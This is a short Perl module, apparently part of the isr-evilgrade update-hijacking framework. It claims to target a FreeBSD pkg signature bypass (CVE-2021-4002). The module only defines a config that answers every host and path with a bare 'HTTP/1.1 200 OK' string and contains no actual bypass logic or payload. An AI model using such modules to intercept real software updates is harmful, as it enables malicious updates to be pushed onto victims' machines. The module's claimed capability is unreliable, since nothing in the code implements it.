###############
# freebsd_pkg_bypass.pm
#
# CVE-2021-4002 (Sig Bypass, CVSS 9.8, Year 2021)
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::freebsd_pkg_bypass;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'    => 'freebsd_pkg_bypass',
    'version' => '1.0',
    'cvss'    => '9.8',
    'type'    => 'Sig Bypass',
    'year'    => '2021',
    'cve'     => 'CVE-2021-4002',
    'vh'      => '(.*)',
    'request' => [{
        'req'   => '/.*',
        'type'  => 'string',
        'string' => 'HTTP/1.1 200 OK',
    }],
};

sub new {
    my $class = shift;
    bless($base, $class);
}

1;
